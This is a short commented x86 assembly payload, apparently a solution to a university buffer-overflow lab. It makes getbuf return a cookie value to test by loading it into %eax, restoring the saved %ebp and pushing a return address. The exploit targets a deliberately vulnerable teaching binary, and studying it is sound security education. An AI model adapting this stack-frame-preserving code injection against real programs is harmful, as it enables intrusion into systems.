# Exploit code that causes getbuf to return your cookie back to test, instead of value 1
# getbuf causes 1 to be moved to %eax, so our goal is to overwrite %eax with cookie

movl $0x36a55b87, %eax # Moves the cookie value to %eax, which will then be returned
movl $0x556839e0, %ebp # Moves the prior %ebp value back
pushl $0x8048c1d # Pushes the mov function that moves %eax to val inside of test
ret # Returns %eax to test after getbuf finishes

